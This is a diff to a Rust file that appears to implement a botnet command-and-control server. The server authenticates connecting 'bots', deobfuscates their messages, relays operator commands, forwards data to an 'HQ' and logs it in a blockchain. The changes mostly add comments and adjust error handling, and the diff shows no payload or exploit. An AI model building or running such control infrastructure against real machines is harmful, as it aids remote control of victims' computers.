@@ -44,23 +44,21 @@ const MSG_SIZE: usize = 4096;
 const USERNAME_LENGTH: usize = 10;
 const IV_LEN: usize = 16;
 
+/// Handling the very first message that is being sent from the client
 async fn handle_message_received(DS: &mut c2::Device_stream, socket: &net::TcpStream) -> Vec<u8> {
     let mut buffer = [0; MSG_SIZE];
     loop {
         socket.readable().await;
         match socket.try_read(&mut buffer) {
-            Ok(0) => {
-                //println!("Client {} (username : {:?}) disconnected", DS.ip_address, from_utf8(&DS.M.Username).unwrap());
+            Ok(0) => { // edode : Client disconnection
                 DS.connected = false;
                 return vec![];
             }
-            Ok(recv_bytes) => {
+            Ok(recv_bytes) => { // edode: Client connection
                 println!("Received message from {} (uid : {:?})", DS.ip_address, from_utf8(&DS.c2_id).unwrap());
             }
             Err(ref e) if e.kind() == io::ErrorKind::WouldBlock => {
-                // edode : Avoid returning an empty vector (empty Incoming_Message)
-                println!("Error: {}", e);
-                //continue;
+                continue;
             }
             Err(e) => {
                 println!("Error: {}", e);
@@ -70,7 +68,9 @@ async fn handle_message_received(DS: &mut c2::Device_stream, socket: &net::TcpSt
     };
 }
 
+/// Creating and authenticating a new user as soon as they have sent the first message
 async fn authenticate_new_user(socket: &net::TcpStream, addr: SocketAddr) -> c2::Device_stream {
+    // edode : Creating a new user
     let mut DS = c2::Device_stream::new(
         addr.to_string(),
         false,
@@ -79,7 +79,7 @@ async fn authenticate_new_user(socket: &net::TcpStream, addr: SocketAddr) -> c2:
         c2::Bot::new(Vec::new(), Vec::new())
     );
     let data = handle_message_received(&mut DS, socket).await;
-    if DS.connected {
+    if DS.connected { // edode : Authenticating client
         let encryption_key = msg::data_processing::deobfuscate_data(data, false, &DS.encryption_key);
         DS.authenticated = true;
         DS.B = msg::serialization::deserialize_rmp(encryption_key);
@@ -88,7 +88,8 @@ async fn authenticate_new_user(socket: &net::TcpStream, addr: SocketAddr) -> c2:
     return DS;
 }
 
-/// One function per bot
+/// Handling the other messages that is being sent from the client
+/// At this level, the client is authenticated and the messages are all encrypted
 async fn handle_message_from_client(
     mut DS: c2::Device_stream,
     mut bot_tx: Sender<c2::Device_stream>,
@@ -101,8 +102,7 @@ async fn handle_message_from_client(
 
     loop {
         match socket.try_read(&mut buffer) {
-            Ok(n) if n == 0 => {
-                //println!("Client {} (username : {:?}) disconnected", DS.ip_address, from_utf8(&DS.B.uid).unwrap());
+            Ok(n) if n == 0 => { // edode : Client disconnection
                 DS.connected = false;
             },
             Ok(recv_bytes) => { // edode : Deobfuscating data and sending it to the HQ
@@ -112,11 +112,6 @@ async fn handle_message_from_client(
                 buffer
                     .iter_mut()
                     .for_each(|x| *x = 0); // reset buffer
-            },
-            Err(ref err) if err.kind() == io::ErrorKind::WouldBlock => {
-                // edode : Avoid returning an empty vector (empty Incoming_Message)
-                //println!("Error: {}", err);
-                //continue; -> removing this allows to listen and to write commands
             },
             Err(err) => {
                 println!("Error: {}", err);
@@ -135,6 +130,7 @@ async fn handle_message_from_client(
     Ok(())
 }
 
+/// Handling the messages that is being sent from the HQ
 fn client_input (
     c2_tx: Sender<Vec<u8>>,
 ) -> io::Result<()> {
@@ -159,37 +155,40 @@ async fn receive_bot_data(
     loop {
         match bot_rx.try_recv() {
             Ok(mut received_data) => {
-                //println!("Received data from channel : {:?} from : {:?}", received_data.B, received_data.ip_address);
-
                 if let Ok(mut Blkchain) = arc_Blkchain.lock() {
-                    if let Ok(mut Blk) = arc_Blk.lock() { // lisandro : clearable
-                        let mut BH = Blk.header.clone();
+                    // edode : Receiving data from the bot and creating a block out of it
+                    if let Ok(mut Blk) = arc_Blk.lock() {
+                        let mut BH: BlockHeader = Blk.header.clone();
                         let mut BD = Blk.data.clone();
                         BH.create_block_header(Blkchain.get_last_block_hash());
                         BD.create_block_data(received_data);
                         Blk.update_block(BH, BD);
                         Blkchain.add_block(Blk.clone());
-                        //println!("Block added to the blockchain");
                     }
-                    //println!("{:?}", Blkchain);
                 }
             },
-            Err(err) => {
-                // edode : empty channel
-                //println!("Could not receive data : {}", err);
+            Err(TryRecvError::Empty) => {
+                continue;
             },
-            _ => {}
+            Err(TryRecvError::Closed) => {
+                println!("No more active receiver, closing connection");
+                return Ok(());
+            },
+            _ => {
+                //println!("Error: {:?}", bot_rx.try_recv());
+            }
         };
     }
     Ok(())
 }
 
+/// Creating or recovering the blockchain
 fn recover_database() -> (Blockchain, Block) {
     // edode : determining if there is data inside the database
     let mut data: bool = false;
     for db_data in database::D.iter(ReadOptions::new()) {
         data = true;
-        break
+        break;
     }
     return if data { // edode : Recovering the blockchain from the database
         let (last_block_id, last_block_data) = database::D.iter(ReadOptions::new()).last().unwrap();
@@ -245,7 +244,7 @@ pub async fn main() -> Result<(), Box<dyn Error>> {
 
         let mut c2_rx = chn_c2_tx.subscribe();
         let c2_tx = chn_c2_tx.clone();
-
+        //let x = &socket;
         tokio::spawn(async move {
             handle_message_from_client(co_clone, bot_tx, c2_rx, socket).await;
         });
